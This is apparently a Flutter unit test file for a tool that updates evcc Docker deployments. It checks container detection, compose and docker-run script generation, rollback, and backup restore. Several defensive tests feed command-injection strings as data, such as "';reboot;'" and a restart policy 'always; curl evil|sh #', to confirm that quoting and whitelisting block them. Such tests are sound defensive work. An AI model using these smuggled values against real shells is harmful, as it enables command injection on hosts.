import 'package:evcc_updater/src/commands.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('parseEvccDocker', () {
    test('finds the evcc container by image among others', () {
      final d = parseEvccDocker('db|postgres:16\nmy-evcc|evcc/evcc:0.123');
      expect(d, isNotNull);
      expect(d!.name, 'my-evcc');
      expect(d.image, 'evcc/evcc:0.123');
    });
    test('matches on the container name too', () {
      final d = parseEvccDocker('evcc|ghcr.io/foo/bar:1');
      expect(d!.name, 'evcc');
    });
    test('returns null when no evcc container is present', () {
      expect(parseEvccDocker('db|postgres:16\nweb|nginx'), isNull);
      expect(parseEvccDocker(''), isNull);
    });

    test('prefers the image match over a sibling matching only by name', () {
      // evcc-db (postgres) sorts first but is NOT the evcc install.
      final d = parseEvccDocker('evcc-db|postgres:16\nevcc|evcc/evcc:latest');
      expect(d!.name, 'evcc');
      expect(d.image, 'evcc/evcc:latest');
    });

    test('does not mistake a lone sibling (evcc-db) for the evcc install', () {
      // Only a sibling running, image has no "evcc", name only contains it as a
      // prefix — must NOT be picked (avoids recreating the wrong container).
      expect(parseEvccDocker('evcc-db|postgres:16'), isNull);
      expect(parseEvccDocker('evcc-grafana|grafana/grafana'), isNull);
    });
  });

  group('isDockerPermissionError', () {
    test('detects the daemon permission / socket errors', () {
      expect(
        isDockerPermissionError(
            'permission denied while trying to connect to the Docker daemon socket'),
        isTrue,
      );
      expect(
        isDockerPermissionError(
            'Cannot connect to the Docker daemon at unix:///var/run/docker.sock'),
        isTrue,
      );
    });
    test('a normal listing is not a permission error', () {
      expect(isDockerPermissionError('evcc|evcc/evcc:latest'), isFalse);
      expect(isDockerPermissionError('bash: docker: command not found'), isFalse);
    });
  });


  group('dockerComposeUpdateScript', () {
    test('pulls then recreates only the evcc service in the project dir', () {
      final script = dockerComposeUpdateScript(const DockerComposeInfo(
        workingDir: '/home/pi/evcc',
        configFile: '/home/pi/evcc/docker-compose.yml',
        service: 'evcc',
      ));
      expect(script, contains("cd '/home/pi/evcc'"));
      expect(script, contains('set -e'));
      // v2 is probed; falls back to the v1 standalone binary.
      expect(script, contains('docker compose version'));
      expect(script, contains('docker-compose'));
      expect(script, contains(r'$DC'));
      // config file pinned with -f so a custom filename can't double-spawn.
      expect(script, contains("-f '/home/pi/evcc/docker-compose.yml'"));
      expect(script, contains("pull 'evcc'"));
      expect(script, contains("up -d 'evcc'"));
    });

    test('pins the compose project with -p when known', () {
      final script = dockerComposeUpdateScript(const DockerComposeInfo(
        workingDir: '/srv/evcc',
        configFile: '/srv/evcc/compose.yaml',
        service: 'evcc',
        project: 'myevcc',
      ));
      expect(script, contains("-p 'myevcc'"));
    });

    test('escapes single quotes so a label cannot break out of the shell', () {
      final script = dockerComposeUpdateScript(const DockerComposeInfo(
        workingDir: "/x';reboot;'",
        configFile: '',
        service: 'evcc',
      ));
      // The dangerous quote is escaped via the '\'' idiom, NOT left to close
      // the cd quoting and start a new `reboot` command.
      expect(script, contains(r"cd '/x'\''"));
      expect(script, isNot(contains("cd '/x';reboot")));
    });
  });

  group('shSingleQuote', () {
    test('wraps plain values and escapes embedded quotes', () {
      expect(shSingleQuote('evcc'), "'evcc'");
      expect(shSingleQuote("a'b"), r"'a'\''b'");
    });
  });

  group('firstInspectObject', () {
    test('takes the first element of the inspect array', () {
      final o = firstInspectObject('[{"Name":"/evcc"},{"Name":"/other"}]');
      expect(o, isNotNull);
      expect(o!['Name'], '/evcc');
    });
    test('accepts a bare object too', () {
      expect(firstInspectObject('{"Name":"/evcc"}')!['Name'], '/evcc');
    });
    test('returns null on empty / garbage / empty array', () {
      expect(firstInspectObject(''), isNull);
      expect(firstInspectObject('not json'), isNull);
      expect(firstInspectObject('[]'), isNull);
    });
  });

  group('composeInfoFromInspect', () {
    test('reads compose labels into DockerComposeInfo', () {
      final c = composeInfoFromInspect({
        'Config': {
          'Labels': {
            'com.docker.compose.project.working_dir': '/home/pi/evcc',
            'com.docker.compose.project.config_files':
                '/home/pi/evcc/docker-compose.yml',
            'com.docker.compose.service': 'evcc',
            'com.docker.compose.project': 'evcc',
          }
        },
      });
      expect(c, isNotNull);
      expect(c!.workingDir, '/home/pi/evcc');
      expect(c.service, 'evcc');
      expect(c.project, 'evcc');
    });
    test('returns null for a plain docker-run container (no compose labels)',
        () {
      expect(composeInfoFromInspect({'Config': {'Labels': {}}}), isNull);
      expect(composeInfoFromInspect({'Config': {}}), isNull);
      expect(composeInfoFromInspect({}), isNull);
    });
    test('rejects a tampered service name or a non-absolute working dir', () {
      Map<String, dynamic> labels(String wd, String svc) => {
            'Config': {
              'Labels': {
                'com.docker.compose.project.working_dir': wd,
                'com.docker.compose.service': svc,
              }
            }
          };
      // Service must match compose's charset; working dir must be absolute.
      expect(composeInfoFromInspect(labels('/home/pi/evcc', 'evcc;reboot')),
          isNull);
      expect(
          composeInfoFromInspect(labels('/home/pi/evcc', "ev'cc")), isNull);
      expect(composeInfoFromInspect(labels('home/pi/evcc', 'evcc')), isNull);
    });
  });

  group('buildDockerRunCommand', () {
    final evccInspect = {
      'Name': '/evcc',
      'Config': {
        'Image': 'evcc/evcc:latest',
        'Env': ['TZ=Europe/Berlin', 'PATH=/usr/local/sbin:/usr/local/bin'],
        'Labels': <String, dynamic>{},
      },
      'HostConfig': {
        'RestartPolicy': {'Name': 'unless-stopped', 'MaximumRetryCount': 0},
        'PortBindings': {
          '7070/tcp': [
            {'HostIp': '', 'HostPort': '7070'}
          ]
        },
        'Binds': ['/home/pi/evcc.yaml:/etc/evcc.yaml'],
        'NetworkMode': 'default',
      },
    };

    test('reconstructs the run command faithfully from inspect', () {
      final cmd = buildDockerRunCommand(evccInspect);
      expect(cmd, startsWith('docker run -d'));
      expect(cmd, contains("--name 'evcc'"));
      expect(cmd, contains('--restart unless-stopped'));
      expect(cmd, contains("-p '7070:7070'"));
      expect(cmd, contains("-v '/home/pi/evcc.yaml:/etc/evcc.yaml'"));
      expect(cmd, contains("-e 'TZ=Europe/Berlin'"));
      expect(cmd, endsWith("'evcc/evcc:latest'"));
    });
    test('drops pure image-default env vars like PATH', () {
      expect(buildDockerRunCommand(evccInspect), isNot(contains('PATH=')));
    });

    // --- audit 2026-08-15: identity/runtime settings the image does NOT
    // re-supply. Dropping them silently changed behaviour on recreate.
    test('preserves user, hostname, extra hosts and the command', () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Id': 'deadbeefcafe',
        'Config': {
          'Image': 'nginx:latest',
          'User': '1000:1000',
          'Hostname': 'my-app',
          'Cmd': ['nginx', '-g', 'daemon off;'],
          'Labels': <String, dynamic>{},
        },
        'HostConfig': {
          'ExtraHosts': ['db:10.0.0.5'],
        },
      });
      expect(cmd, contains("--user '1000:1000'"));
      expect(cmd, contains("--hostname 'my-app'"));
      expect(cmd, contains("--add-host 'db:10.0.0.5'"));
      // Command comes AFTER the image, like docker itself expects.
      expect(cmd.indexOf("'nginx:latest'"), lessThan(cmd.indexOf("'-g'")));
      expect(cmd, endsWith(r"'nginx' '-g' 'daemon off;'"));
    });

    test('a docker-generated hostname (= container id prefix) is not re-passed',
        () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Id': 'abc123def456',
        'Config': {'Image': 'nginx', 'Hostname': 'abc123def456'.substring(0, 12)},
        'HostConfig': <String, dynamic>{},
      });
      expect(cmd, isNot(contains('--hostname')));
    });

    test('a custom entrypoint survives, remainder lands after the image', () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Config': {
          'Image': 'busybox',
          'Entrypoint': ['/bin/sh', '-c'],
          'Cmd': ['echo hi'],
        },
        'HostConfig': <String, dynamic>{},
      });
      expect(cmd, contains("--entrypoint '/bin/sh'"));
      expect(cmd, endsWith(r"'busybox' '-c' 'echo hi'"));
    });

    test('hostile values in the new fields cannot break out', () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Config': {
          'Image': 'x',
          'User': "root';reboot;'",
          'Cmd': ["a';reboot;'"],
        },
        'HostConfig': {
          'ExtraHosts': ["h';reboot;'"],
        },
      });
      expect(cmd, contains(r"'\''")); // escaped, not left to close the quote
      expect(cmd, isNot(contains("root';reboot")));
      expect(cmd, isNot(contains("a';reboot")));
      expect(cmd, isNot(contains("h';reboot")));
    });
    test('lets the image be overridden with a new tag', () {
      expect(buildDockerRunCommand(evccInspect, image: 'evcc/evcc:0.999'),
          endsWith("'evcc/evcc:0.999'"));
    });
    test('carries --device / --privileged / --group-add (serial-meter setups)',
        () {
      final serial = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'Privileged': true,
          'Devices': [
            {
              'PathOnHost': '/dev/ttyUSB0',
              'PathInContainer': '/dev/ttyUSB0',
              'CgroupPermissions': 'rwm'
            }
          ],
          'GroupAdd': ['dialout'],
          'CapAdd': ['SYS_RAWIO'],
          'RestartPolicy': {'Name': 'unless-stopped'},
        },
      };
      final cmd = buildDockerRunCommand(serial);
      expect(cmd, contains("--device '/dev/ttyUSB0:/dev/ttyUSB0:rwm'"));
      expect(cmd, contains('--privileged'));
      expect(cmd, contains("--group-add 'dialout'"));
      expect(cmd, contains("--cap-add 'SYS_RAWIO'"));
    });

    test('carries user labels but drops image/infra labels', () {
      final labeled = {
        'Name': '/evcc',
        'Config': {
          'Image': 'evcc/evcc:latest',
          'Labels': {
            'traefik.enable': 'true',
            'org.opencontainers.image.version': '0.123',
            'com.docker.compose.project': 'should-not-leak',
          },
        },
        'HostConfig': <String, dynamic>{},
      };
      final cmd = buildDockerRunCommand(labeled);
      expect(cmd, contains("-l 'traefik.enable=true'"));
      expect(cmd, isNot(contains('org.opencontainers')));
      expect(cmd, isNot(contains('com.docker')));
    });

    test('drops a tampered restart-policy name (whitelist) — no injection', () {
      final evil = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'RestartPolicy': {'Name': r'always; curl evil|sh #'},
        },
      };
      final cmd = buildDockerRunCommand(evil);
      expect(cmd, isNot(contains('curl evil')));
      expect(cmd, isNot(contains('--restart')));
    });

    test('brackets an IPv6 host IP in a port binding', () {
      final v6 = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'NetworkMode': 'bridge',
          'PortBindings': {
            '7070/tcp': [
              {'HostIp': '::', 'HostPort': '7070'}
            ]
          },
        },
      };
      expect(buildDockerRunCommand(v6), contains("-p '[::]:7070:7070'"));
    });

    test('host network mode is preserved and -p is dropped', () {
      final hostNet = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'NetworkMode': 'host',
          'PortBindings': {
            '7070/tcp': [
              {'HostIp': '', 'HostPort': '7070'}
            ]
          },
          'RestartPolicy': {'Name': 'always'},
        },
      };
      final cmd = buildDockerRunCommand(hostNet);
      expect(cmd, contains("--network 'host'"));
      expect(cmd, isNot(contains('-p ')));
      expect(cmd, contains('--restart always'));
    });
  });

  group('dockerRunRecreateScript', () {
    test('pulls, backs up the old container by rename, then runs the new one',
        () {
      final script = dockerRunRecreateScript(
        name: 'evcc',
        image: 'evcc/evcc:latest',
        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
      );
      expect(script, contains("docker pull 'evcc/evcc:latest'"));
      expect(script, contains("docker stop 'evcc'"));
      expect(script, contains("docker rename 'evcc' 'evcc-evccpitool-old'"));
      expect(script, contains("docker run -d --name 'evcc'"));
      expect(script, contains('set -e'));
    });

    test('auto-rolls back to the old container if the new one fails to start',
        () {
      final script = dockerRunRecreateScript(
        name: 'evcc',
        image: 'evcc/evcc:latest',
        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
      );
      // On run failure: restore the old container's name and start it again.
      expect(script, contains("docker rename 'evcc-evccpitool-old' 'evcc'"));
      expect(script, contains("docker start 'evcc'"));
      expect(script, contains('||'));
    });

    test('rolls back when the new container is accepted but then crashes', () {
      final script = dockerRunRecreateScript(
        name: 'evcc',
        image: 'evcc/evcc:latest',
        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
      );
      // `docker run -d` returns 0 on accept, so verify it is actually Running…
      expect(script, contains("docker inspect -f '{{.State.Running}}' 'evcc'"));
      // …and if not, restore the retained old container and fail.
      expect(script, contains("docker rename 'evcc-evccpitool-old' 'evcc'"));
      expect(script, contains('exit 1'));
    });
  });

  group('parseBackupList', () {
    test('lists .tar.gz archive paths, newest first, ignoring noise', () {
      const out = '/var/backups/evcc/evcc-backup-20260630-120000.tar.gz\n'
          '/var/backups/evcc/evcc-backup-20260628-090000.tar.gz\n';
      final list = parseBackupList(out);
      expect(list, [
        '/var/backups/evcc/evcc-backup-20260630-120000.tar.gz',
        '/var/backups/evcc/evcc-backup-20260628-090000.tar.gz',
      ]);
    });
    test('empty when there are no backups', () {
      expect(parseBackupList(''), isEmpty);
      expect(parseBackupList('ls: cannot access: No such file'), isEmpty);
    });
  });

  group('buildRestoreScript', () {
    test('stops evcc, extracts the archive to /, restarts evcc', () {
      final s =
          buildRestoreScript('/var/backups/evcc/evcc-backup-20260630.tar.gz');
      expect(s, contains('systemctl stop evcc'));
      expect(s,
          contains("tar -xzf '/var/backups/evcc/evcc-backup-20260630.tar.gz' -C /"));
      expect(s, contains('systemctl start evcc'));
    });
    test('single-quotes the path so it cannot break out of the shell', () {
      final s = buildRestoreScript("/var/backups/evcc/x';reboot;'.tar.gz");
      expect(s, contains(r"'\''")); // the quote was escaped, not left to close
      expect(s, isNot(contains("x';reboot"))); // no unescaped breakout
    });
  });
}
